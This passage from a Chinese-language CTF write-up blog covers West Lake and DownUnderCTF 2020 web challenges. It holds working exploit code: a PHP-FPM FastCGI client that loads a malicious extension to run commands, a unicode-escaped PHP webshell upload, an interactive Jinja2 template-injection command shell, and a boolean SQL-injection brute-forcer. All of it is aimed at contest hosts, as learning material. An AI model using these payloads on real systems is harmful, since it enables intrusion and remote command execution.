(ord($data&#123;$p++&#125;));<br>            &#125;<br>            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);<br>            $p += ($nlen + $vlen);<br>        &#125;<br>        <span class="hljs-keyword">return</span> $array;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildAllPacket</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $params, $stdin</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// Ensure new requestID is not already being tracked</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_requestCounter++;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_requestCounter &gt;= <span class="hljs-number">65536</span> <span class="hljs-comment">/* or (1 &lt;&lt; 16) */</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;_requestCounter = <span class="hljs-number">1</span>;<br>            &#125;<br>            $id = <span class="hljs-keyword">$this</span>-&gt;_requestCounter;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_requests[$id]));<br>        $request = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>), $id);<br>        $paramsRequest = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> ($params <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>            $paramsRequest .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair($key, $value, $id);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($paramsRequest) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, $paramsRequest, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">if</span> ($stdin) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, $stdin, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">return</span> $request;<br>    &#125;<br>&#125;<br>$sock = stream_socket_client(<span class="hljs-string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, $errno, $errstr);<br>$client = <span class="hljs-keyword">new</span> Client();<br>$payload_file = <span class="hljs-string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;<br>$params = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; $payload_file,<br>    <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="hljs-string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,<br>    <span class="hljs-comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span><br>);<br>$data = $client-&gt;buildAllPacket($params, <span class="hljs-string">&#x27;&#x27;</span>);<br>fwrite($sock, $data);<br>var_dump(fread($sock, <span class="hljs-number">4096</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>s.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> antsystem(<span class="hljs-string">&quot;/readflag&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li>从一道CTF学习Fastcgi绕过姿势：<a href="https://www.anquanke.com/post/id/186186#h2-4">https://www.anquanke.com/post/id/186186#h2-4</a></li><li>2019 0ctf final Web Writeup（1）：<a href="https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/">https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/</a></li><li>php 自定义恶意扩展 so 编写过程：<a href="https://xz.aliyun.com/t/7330#toc-3">https://xz.aliyun.com/t/7330#toc-3</a></li><li>Fastcgi 协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> </li><li>西湖论剑初赛Web1/5：<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol><hr><h1 id="EasyJson（php-审计）"><a href="#EasyJson（php-审计）" class="headerlink" title="EasyJson（php 审计）"></a>EasyJson（php 审计）</h1><p><strong>基本步骤</strong></p><ul><li>filename=index.php 可过 check</li><li>使用 application/json 类型的 enctype 发送构造好的数据包</li><li>使用 burpsuite 将关键代码转 unicode，发送后得到地址。(不用改 x-Forward-For 也可以)</li><li>执行命令：<br><a href="http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag</a></li><li>得到 flag{a5db5397505f825334aa4dfc17d3bb9f} Powered By Dbapp OSS.</li></ul><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;security.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br>$sandbox = <span class="hljs-string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>var_dump($sandbox);<br><span class="hljs-keyword">if</span>(!file_exists($sandbox))&#123;<br>    mkdir($sandbox);<br>    file_put_contents($sandbox.<span class="hljs-string">&quot;index.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);<br>&#125;<br>$action = $_GET[<span class="hljs-string">&#x27;action&#x27;</span>];<br>$content = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><br><span class="hljs-keyword">if</span>($action == <span class="hljs-string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="hljs-string">&#x27;filename&#x27;</span>,$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="hljs-string">&#x27;content&#x27;</span>,$content))&#123;<br>    $content = json_decode($content);<br>    $filename = $_GET[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    $filecontent = $content-&gt;content;<br>    $filename = $sandbox.$filename;<br>    file_put_contents($filename,$filecontent.<span class="hljs-string">&quot;\n Powered By Dbapp OSS.&quot;</span>);<br>&#125;<span class="hljs-keyword">elseif</span>($action == <span class="hljs-string">&quot;reset&quot;</span>)&#123;<br>    $files = scandir($sandbox);<br>    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file) &#123;<br>        <span class="hljs-keyword">if</span>(!is_dir($file))&#123;<br>            <span class="hljs-keyword">if</span>($file !== <span class="hljs-string">&quot;index.php&quot;</span>)&#123;<br>                unlink($sandbox.$file);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Security Check Failed.&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>数据包</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?source=1&amp;action=write&amp;filename=index.php</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: easyjson.xhlj.wetolink.com<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">Cache-Control</span>: max-age=0<br><span class="hljs-attribute">X-Forwarded-For</span>: 127.0.0.1<br><span class="hljs-attribute">X-Originating-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-Addr</span>: 127.0.0.1<br><span class="hljs-attribute">Content-Length</span>: 191<br><br>&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;<br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li>西湖论剑初赛Web1/5：<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年9月DownUnderCTF</title>
    <link href="/2020/09/30/20200930-DownUnderCTF/"/>
    <url>/2020/09/30/20200930-DownUnderCTF/</url>
    
    <content type="html"><![CDATA[<p>官方 writeup 地址：<a href="https://github.com/DownUnderCTF/Challenges_2020_public">https://github.com/DownUnderCTF/Challenges_2020_public</a><br>题目地址：<a href="https://play.duc.tf/challenges">https://play.duc.tf/challenges</a></p><hr><a id="more"></a><h1 id="Web-Badmin（DNS配置）"><a href="#Web-Badmin（DNS配置）" class="headerlink" title="Web Badmin（DNS配置）"></a>Web Badmin（DNS配置）</h1><p>题目：web badmin</p><p>提示：We launched a game and now it is no longer launched :( can you figure out what happened plox. HALP</p><p>视频上方：me rn。windows</p><p>注释：<code>&lt;!-- &lt;a href=&quot;https://epicgame.play.duc.tf&quot;&gt;Play our new game here!&lt;/a&gt; --&gt;</code>，注释中的网站无法打开</p><p>beep boop：哔哔声</p><p>没有cookie</p><p>hint：Boss: we are firing you. The game doesn’t even load. Web admin: it was just a simple misconfiguration, i clicked the wrong button 😞</p><p>发现注释中有提示信息，使用浏览器、ping工具、curl工具（几种常用的工具）都没有任何响应，束手无策。</p><p>最后查看题解才知道，无法连接是由于DNS的原因，使用dig、host即可获得flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>host -t txt epicgame.play.duc.tf<br><br>dig epicgame.play.duc.tf TXT         <span class="hljs-comment"># dig 命令主要用来从 DNS 域名服务器查询主机地址信息。</span><br><br></code></pre></td></tr></table></figure><p>在 DNS 协议中有很多的资源协议类型，TXT 属于其中一种。</p><ul><li>A记录 - 保存域的IP地址的记录。</li><li>CNAME记录 - 将一个域或子域转发到另一个域，不提供IP地址。</li><li>MX记录 - 将邮件定向到电子邮件服务器。</li><li>TXT记录 - 允许管理员在记录中存储文本注释。</li><li>NS记录 - 存储DNS条目的名称服务器。</li><li>SRV记录 - 指定特定服务的端口。</li></ul><hr><h1 id="Robotsss（SSTI）"><a href="#Robotsss（SSTI）" class="headerlink" title="Robotsss（SSTI）"></a>Robotsss（SSTI）</h1><p>题目地址：<a href="https://chal.duc.tf:30106/">https://chal.duc.tf:30106/</a><br>Us robot devs use better templates than those stupid humans!</p><p>注册并登陆系统，可以得到两个提示信息。第一个信息暗示 humans.txt 中有其他信息（<code>dirsearch</code> 工具也可以扫到），第二个提示暗示 flag 位于 /s3cr3t_p4th/robot_fl4g.txt。在第一个提示的源码中有一串二进制码，解码可得 humen.txt（二进制转ascii），第二篇文章的二进制解码得 fl4g.txt。</p><p>根据第一个暗示我们找到另一个地址(<a href="https://chal.duc.tf:30106/4dm1n_Cr3ds)%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%BB%99%E5%87%BA%E4%B8%80%E6%AE%B5">https://chal.duc.tf:30106/4dm1n_Cr3ds)，这个地址给出一段</a> admin credit 为 6zMLV46JRp6kAmTs3nx5AG4WJgYeY.</p><p>访问 humen.txt 地址发现一张图片，使用 <code>strings</code> 工具处理图片（<code>binwalk</code>、<code>foremost</code> 都测试过），得到一串二进制码</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br><span class="hljs-number">011000010110010001101101011010010110111000111010010101000110100001101001011100110010110101001001011100110010110101010100011010000110010100101101010000010110010001101101011010010110111000101101010100000110000101110011011100110111011101101111011100100110010000101101010110000100010000100001</span><br><br></code></pre></td></tr></table></figure><p>解码得到 admin:This-Is-The-Admin-Password-XD!，看上去很像是账号密码。</p><p>使用 admin 账号登陆成功。前几天做了很多命令注入的题目（<code>Python</code>、<code>Java</code>），以为这个题目还是命令注入，最后发现是模版注入。并且还在控制台发现：Werkzeug/0.16.0 Python/3.7.9。</p><p>测试代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;1+1&#125;&#125;                  =&gt; jinja2 <br>&#x27;a&#x27;&#x27;a&#x27;                   =&gt; shell <br>&#x27;a&#x27;.length               =&gt; js <br>len(&#x27;a&#x27;)                 =&gt; python <br>&#x27;a&#x27;.charAt(0)            =&gt; java<br><br>&#123;&#123;1+1&#125;&#125;                  =&gt; 模版注入<br></code></pre></td></tr></table></figure><p>最后根据漏洞特性构造 exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    get_para = <span class="hljs-string">&#x27;a=__class__&amp;&amp;b=__mro__&amp;&amp;c=__getitem__&amp;&amp;d=__subclasses__&amp;&amp;e=__init__&amp;&amp;f=__globals__&#x27;</span><br>    <span class="hljs-comment"># get_para = &#x27;&#x27;</span><br>    <span class="hljs-comment"># post_para = input(&#x27;POST:&#x27;)</span><br>    cmd = input(<span class="hljs-string">&#x27;cmd:&#x27;</span>)<br>    post_para = <span class="hljs-string">&quot;&#123;&#123; &#x27;&#x27;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(1)|attr(request.args.d)()|attr(request.args.c)(127)|attr(request.args.e)|attr(request.args.f)|attr(request.args.c)(&#x27;popen&#x27;)(&#x27;&quot;</span> + cmd + <span class="hljs-string">&quot;&#x27;)|attr(&#x27;read&#x27;)() &#125;&#125;&quot;</span><br><br>    base_url = <span class="hljs-string">&#x27;https://chal.duc.tf:30106/admin.php?&#x27;</span> + get_para<br><br>    resp = requests.post(<br>        url=base_url,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;user_in&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> + post_para + <span class="hljs-string">&#x27;&#x27;</span><br>        &#125;,<br>        cookies=&#123;<br>            <span class="hljs-string">&#x27;session&#x27;</span>: <span class="hljs-string">&#x27;.eJwlzjsOwjAMANC7eO5gO4kT9zJV4o9gbemEuDtIrG96bzjyjOsB--u8Y4Pj6bDDGNU4F7EnEkntWEiwhok3CfyJUS_ckigxQ1pxr5pNcxrqIp_K4itqFF02zSZLH73ZQPeCGD2YURZiGaJ1tjXWbEO465wFFTa4rzj_GYLPF1GiLjY.X2bocA.l7FpHpE9qJ_HHpRBtjQGgDwGd0Y&#x27;</span>&#125;<br>    )<br><br>    soup = BeautifulSoup(markup=resp.content, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br>    print(<span class="hljs-string">f&#x27;result: <span class="hljs-subst">&#123;soup.find(<span class="hljs-string">&quot;p&quot;</span>).get_text()&#125;</span>&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;-------------------------------------------------------&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure><p>成功 getshell，并得到 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930102222.png"></p><p>官方题解：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss</a></p><p>通过题解可知，6zMLV46JRp6kAmTs3nx5AG4WJgYeY 为 <code>base58</code> 编码，可以通过 <code>&#123;&#123; config.items() &#125;&#125;</code> 查看系统配置信息，配置信息中的函数用于暗示该函数可以使用。还可以使用 Jinja 自带的语法（<code>&#123;&#123; getFile("/fl4g.txt") &#125;&#125;</code>）来读取 flag 文件。</p><hr><h1 id="Cookie-Clicker（逻辑漏洞）"><a href="#Cookie-Clicker（逻辑漏洞）" class="headerlink" title="Cookie Clicker（逻辑漏洞）"></a>Cookie Clicker（逻辑漏洞）</h1><ul><li>题目地址：<a href="https://cookie-clicker1.web.app/">https://cookie-clicker1.web.app/</a></li><li>官方题解：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md</a></li><li>题解地址：<a href="https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker">https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker</a></li></ul><p>Click da cookie and you get to increase da cookie. Built this using epic Firebase. Built this in a day HOW COOL is firebase! Didn’t need to worry about security because it’s all handled by Google :) just click cookies and enjoy</p><p>WriteUp：我从题目中提取到的关键词是 epic Firebase，Flag 可能和 Firebase 有关。将相关简单流程操作了一下，并未发现异常情况（看了一下请求参数，太复杂了）。题目中还涉及 Google，心生敬畏之心，简单查看源文件之后果断放弃（这种大型网站从来没做过。</p><p>查看题解过后发现第一步的思路是正确的，但是没有去搜索 Firebase。Firestore 是一个数据库服务，并且 WriteUp 提到「Firebase 有一个关键的安全问题——设置访问控制，否则任意用户都能访问数据」。</p><blockquote><p>note：大型服务商（Google）提供的服务通常的问题都出在配置问题。（不然早就修复了</p></blockquote><p>然后观察题目发送的请求（注意观察存在关键词的请求），第一次请求和后面的请求不相同，通常应该联想到第一次请求是在申请授权。按照 <a href="https://firebase.google.com/docs/firestore/use-rest-api">Cloud Firestore API</a> 的教程，使用申请授权的信息向 Firebase 进行验证即可得到 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>curl -H <span class="hljs-string">&quot;Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjczNzVhZmY3MGRmZTNjMzNlOTBjYTM2OWUzYTBlZjQxMzE3MmZkODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY29va2llLWNsaWNrZXIxIiwiYXVkIjoiY29va2llLWNsaWNrZXIxIiwiYXV0aF90aW1lIjoxNjAwNjE1MDYzLCJ1c2VyX2lkIjoiRXVhUkdDU2t0R040Nnh0MWdBRUgzbEw5MkFyMSIsInN1YiI6IkV1YVJHQ1NrdEdONDZ4dDFnQUVIM2xMOTJBcjEiLCJpYXQiOjE2MDA2MTgzNjYsImV4cCI6MTYwMDYyMTk2NiwiZW1haWwiOiJrZWt3QGtla3cua2VrdyIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJrZWt3QGtla3cua2VrdyJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.cHgPEFjfZ0J408lkrRfow_3iIsiLYTd1EVIP28NSvj9ZQIKdY6sZtIJ7XPpeVCcxWcswx9tv4Ftv6uNkgF67HeAccyY7I9YwDQuhWrPIAGMNBbQ2qoq19YbpfLy_Ot-0LRE8z9jpPL8uwEDyy8vX_PPPZAmcFHX3nQe1ltvMWDLGVeIUP4F-tDtHX5NGL-UngGPvEAg6qfpzY5tax6NzPwi-HDRDLHLPa4ayiQurwAw2hs0CTOwvbMDjf8YzoNeL0fscukyOPsFZOw-0L0nQbO4FF0GdfZLLski4VvD0XK8N9lkc_Vtn0cqZ1bN3f7Sof28KAvNf5Is-_JnO6fxz1g&quot;</span> <span class="hljs-string">&quot;https://firestore.googleapis.com/v1/projects/cookie-clicker1/databases/(default)/documents/cookies&quot;</span><br><br></code></pre></td></tr></table></figure><p>官方的 writeup 则是使用 firestore 在源码中搜索能找到登陆的关键凭证，但后面的步骤就很难联想到。（这个题脑洞是真滴大</p><hr><h1 id="CicleSpace（SQL注入）"><a href="#CicleSpace（SQL注入）" class="headerlink" title="CicleSpace（SQL注入）"></a>CicleSpace（SQL注入）</h1><ul><li>题目链接：<a href="https://chal.duc.tf:30103/">https://chal.duc.tf:30103/</a></li><li>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md</a></li></ul><p>Oh, how I miss /r/place and /r/circleoftrust. That’s why I decided to create my own one for y’all to play with.<br>/* some bruteforce may be required */</p><p>猜测为SQL注入，但是没有成功注入。发送空数据时，返回报错（400）。</p><p>查看题解后发现，fuzz SQL注入时，最好把自己写入的参数删掉（参数为空）。参考题解的 payload，添加名为 1 的 Person，然后再分别使用：<code>1&quot; AND 1=0  #</code>，<code>1&quot; AND 1=1  #</code> 进行查询，即可发现为 Boolean 注入，然后使用 Boolean 注入的方法进行爆破即可。（使用 <code>2&quot; # </code> 也能查出来）</p><blockquote><p>细心一点测试，这个题应该能做（</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>CHARSET = list(string.ascii_lowercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHARSET_CASE_SENSITIVE = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><br>BASE_URL = <span class="hljs-string">&quot;http://localhost:5000&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">url: str, sql: str, result: list, charset=CHARSET, current=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>        r = s.get(url, params=&#123;<span class="hljs-string">&quot;name&quot;</span>: sql.format(current + i + <span class="hljs-string">&quot;%&quot;</span>)&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;is not part&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            found = <span class="hljs-literal">True</span><br>            res = query(url, sql, result, charset=charset, current=current + i)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:<br>                result.append(current + i)<br>    <span class="hljs-keyword">return</span> found<br>      <br>s = requests.Session()<br><span class="hljs-comment"># create a circle</span><br>r = s.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/create&quot;</span>, data=&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;lol&quot;</span>&#125;)<br>circle_url = r.url<br><br><span class="hljs-comment"># find the right table</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_tables</span>():</span><br>    q = <span class="hljs-string">&#x27;&quot; AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_type=&quot;BASE TABLE&quot; AND table_schema=&quot;circlespace&quot; AND table_name LIKE &quot;&#123;&#125;&quot; -- a&#x27;</span><br>    tables = []<br>    query(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;circle_url&#125;</span>/people&quot;</span>, q, tables)<br>    <span class="hljs-keyword">return</span> tables<br><br>print(get_tables())<br><br></code></pre></td></tr></table></figure><hr><h1 id="Taking-Stock（Python序列化）"><a href="#Taking-Stock（Python序列化）" class="headerlink" title="Taking Stock（Python序列化）"></a>Taking Stock（Python序列化）</h1><p>题目地址：<a href="https://chal.duc.tf:30104/">https://chal.duc.tf:30104/</a></p><p>After taking one unit of AI at uni I’m now a pro. My linear regression model is amazing at predicting the stock market. I’m so proud of it I’m even offering it as a service. Can’t wait to get that VC money!</p><p>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock</a></p><p>登陆后可以发现，Profile Picture 泄漏了 uuid。解码 session 后获得 <code>&#123;&quot;id&quot;:&quot;74795b25-010e-4fca-9e7b-ae05a000d089&quot;,&quot;username&quot;:&quot;1&quot;&#125;_q?G??&#39;1v8aF??j?????&gt;p?4</code>。和图片的 uuid（<code>&lt;img src=&quot;/profile-picture/74795b25-010e-4fca-9e7b-ae05a000d089&quot; alt=&quot;Profile 